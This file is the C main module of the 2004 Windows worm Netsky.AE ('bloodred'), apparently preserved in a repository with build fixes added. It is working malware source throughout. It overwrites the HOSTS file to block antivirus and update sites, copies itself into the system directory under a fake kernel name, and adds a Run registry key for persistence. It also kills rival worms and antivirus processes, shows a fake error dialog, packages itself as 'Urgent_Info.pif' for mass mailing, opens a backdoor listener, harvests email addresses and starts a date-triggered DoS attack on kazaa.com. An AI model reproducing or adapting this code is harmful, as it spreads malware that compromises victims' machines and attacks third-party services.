/**************************************************
*            Netsky.AE(bloodred)
*
*   Project History: 
*        Main idea - November 2003
*        Initial design - December 2003
*        First half of virus completed - February 2004
*        Retrieved project source code; import to GIT repo; 
*        added Linux env build Makefile; added missing libs
*        (advapi32, user32, shell32) to allow compilation; 
*        see GIT history for any (possible?) future changes. 
*
*/

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock.h>
#include "backdoor.h"
#include "KillProc.h"
#include "Harvester.h"
#include "ZipIt.h"
#include "Base64.h"
#include "DOS.h"
#include <stdio.h>

#pragma comment (lib,"ws2_32.lib")
#pragma comment (lib,"AdvAPI32.Lib")
#pragma comment (lib,"User32.Lib")
#pragma comment (lib,"Shell32.Lib")
 


//message that is compiled into exe
static const char *szMsg[] = {
		
		"Live life as it is or live life as it comes. "
			"Written by Jackhole"
			
			
	};
//kill all netsky and sasser variants
void kill_skynet()
{
	CreateMutexA(NULL, TRUE, "AdmMoodownJKIS003");
	CreateMutexA(NULL, TRUE, "(S)(k)(y)(N)(e)(t)");
	CreateMutexA(NULL, TRUE, "____--->>>>U<<<<--____");
	CreateMutexA(NULL, TRUE, "NetDy_Mutex_Psycho");
	CreateMutexA(NULL, TRUE, "_-=oOOSOkOyONOeOtOo=-_");
	CreateMutexA(NULL, TRUE, "SyncMutex_USUkUyUnUeUtUU");
	CreateMutexA(NULL, TRUE, "SyncMutex_USUkUyUnUeUtU");
	CreateMutexA(NULL, TRUE, "Protect_USUkUyUnUeUtU_Mutex");
	CreateMutexA(NULL, TRUE, "89845848594808308439858307378280987074387498739847");
	CreateMutexA(NULL, TRUE, "_-oOaxX|-+S+-+k+-+y+-+N+-+e+-+t+-|XxKOo-_");
	CreateMutexA(NULL, TRUE, "_-oO]xX|-S-k-y-N-e-t-|Xx[Oo-_");
	CreateMutexA(NULL, TRUE, "Bgl_*L*o*o*s*e*");
	CreateMutexA(NULL, TRUE, "NetDy_Mutex_Psycho");
	CreateMutexA(NULL, TRUE, "Rabbo_Mutex");
	CreateMutexA(NULL, TRUE, "Rabbo");
	CreateMutexA(NULL, TRUE, "SkYnEt_AVP");
	CreateMutexA(NULL, TRUE, "KO[SkyNet.cz]SystemsMutex");
	CreateMutexA(NULL, TRUE, "MI[SkyNet.cz]SystemsMutex");
	CreateMutexA(NULL, TRUE, "Netsky AV Guard");
	CreateMutexA(NULL, TRUE, "LK[SkyNet.cz]SystemsMutex");
	CreateMutexA(NULL, TRUE, "[SkyNet.cz]SystemsMutex");
	CreateMutexA(NULL, TRUE, "AdmSkynetJKIS003"); 
CreateMutexA(NULL, TRUE, "SkyNet-Sasser"); 
	CreateMutexA(NULL, TRUE, "S-k-y-n-e-t--A-n-t-i-v-i-r-u-s-T-e-a-m"); 
CreateMutexA(NULL, TRUE, "MuXxXxTENYKSDesignedAsTheFollowerOfSkynet-D"); 
CreateMutexA(NULL, TRUE, "Jobaka3");
CreateMutexA(NULL, TRUE, "Jobaka3l");
CreateMutexA(NULL, TRUE, "JumpallsNlsTillt");
CreateMutexA(NULL, TRUE, "SkynetSasserVersionWithPingFast");
CreateMutexA(NULL, TRUE, "SkynetNotice");
CreateMutexA(NULL, TRUE, "'D'r'o'p'p'e'd'S'k'y'N'e't'");

}


//overwrite localhost file
void host(void)
{
	
char host[MAX_PATH];

GetSystemDirectory(host, sizeof(host));

strcat(host, "\\Drivers\\ETC\\HOSTS");

	const char* buffer = "127.0.0.1 www.norton.com 127.0.0.1 norton.com 127.0.0.1 yahoo.com 127.0.0.1 www.yahoo.com 127.0.0.1 microsoft.com 127.0.0.1 www.microsoft.com 127.0.0.1 windowsupdate.com 127.0.0.1 www.windowsupdate.com 127.0.0.1 www.mcafee.com 127.0.0.1 mcafee.com 127.0.0.1 www.nai.com 127.0.0.1 nai.com 127.0.0.1 www.ca.com 127.0.0.1 ca.com 127.0.0.1 liveupdate.symantec.com 127.0.0.1 www.sophos.com 127.0.0.1 www.google.com 127.0.0.1 google.com";



DWORD byte;
HANDLE hFile = CreateFile(host, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
BOOL bSuccess = WriteFile ( hFile, buffer, strlen(buffer), &byte, NULL);
CloseHandle(hFile);
	  
      
}


void bldred_install()
{
	char pathname[256];
char windir[MAX_PATH];
char bldred_instpath[MAX_PATH];

GetSystemDirectory(windir, sizeof(windir));
HMODULE hMe = GetModuleHandle(NULL);
DWORD nRet = GetModuleFileName(hMe, pathname, 256);

strcat(windir, "\\Windows_kernel32.exe");
CopyFile(pathname,windir,0);

lstrcpy(bldred_instpath,windir);

char buffer[60];
unsigned long size = sizeof(buffer);
strcpy(buffer, bldred_instpath);
HKEY software;
HKEY mykey;
RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\",&software);
RegCreateKey(software,"Run",&mykey);
RegSetValueEx(mykey,"Microsoft Kernel",NULL,REG_SZ,(LPBYTE)buffer,size);
RegCloseKey(mykey);
RegCloseKey(software);
	
}


int bldred_mutex()
{
	CreateMutexA(NULL, TRUE, "~~~Bloodred~~~owns~~~you~~~xoxo~~~2004"); 
if (GetLastError() == ERROR_ALREADY_EXISTS)
ExitProcess(0); 
return 0;
}
//display fake error message only once. If it can't find frun.txt then thats when it displays the message
void msg()
{

	char host[MAX_PATH];
GetSystemDirectory(host, sizeof(host));
strcat(host, "\\frun.txt");
FILE* fin;
		fin = fopen(host,"rb");
	if (fin==NULL) 
MessageBox(NULL,"Windows encountered an error reading the file","Error",MB_OK|MB_ICONERROR);
	const char* buffer = "Here's Johnny :)"; //just a message within frun.txt
	DWORD byte;
HANDLE hFile = CreateFile(host, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
BOOL bSuccess = WriteFile (hFile, buffer, strlen(buffer), &byte, NULL);
CloseHandle(hFile);

}
void bldred_mail_install()
{

	char systemdir[100];
	char systemdir2[100];
	char systemdir3[100];

	GetSystemDirectory(systemdir,sizeof(systemdir));
	GetSystemDirectory(systemdir2,sizeof(systemdir2));
	GetSystemDirectory(systemdir3,sizeof(systemdir3));
	strcat(systemdir,"\\bloodred.exe");
	strcat(systemdir2,"\\base64zip.sys");
	strcat(systemdir3,"\\base64exe.sys");
	char buf3[260]; 
	char windir[260];
	GetWindowsDirectory(windir,sizeof(windir));
	GetModuleFileName(NULL,buf3,MAX_PATH);
CopyFile(buf3,systemdir,0);
strcat(windir,"\\bloodred.zip");
zip_store(buf3,windir,"Urgent_Info.pif");
EncodeBase64(windir,systemdir2);
EncodeBase64(windir,systemdir3);
}

//if it's past october 11th 2004 perform the DOS attack against kazaa.com, those damn
// spyware writers. 
int chk_dos_date()
{
	static const SYSTEMTIME termdate = { 2004,10,0,11,   16,38,43 };
	FILETIME ftime_c, ftime_f;
	GetSystemTimeAsFileTime(&ftime_c);
	SystemTimeToFileTime(&termdate, &ftime_f);
	if (ftime_c.dwHighDateTime > ftime_f.dwHighDateTime) return 1;
	if (ftime_c.dwHighDateTime < ftime_f.dwHighDateTime) return 0;
	if (ftime_c.dwLowDateTime > ftime_f.dwLowDateTime) return 1;
	return 0;
}


void bldred_main()

{

 DWORD pl;
 DWORD tid;

 	endAvSoft();
	//if the date is passed the 11th create the dos attack thread
	if(chk_dos_date()) CreateThread(0, 0, DOSATTACK, NULL, 0, &tid);
	bldred_mail_install();
 bldred_mutex();
	CreateThread(0, 0, listening, NULL, 0, &pl);
	msg();
		kill_skynet();
	bldred_install();
   host();
harvest_main();

}

//VIRUS ENTRY POINT. WITHOUT THIS, THE VIRUS WON'T RUN, DUH!
int _stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmd, int nCmdShow)
{
//startup: Windows Socket Library
	WSADATA data;	
	WSAStartup(MAKEWORD(2,0), &data);
	bldred_main();
}
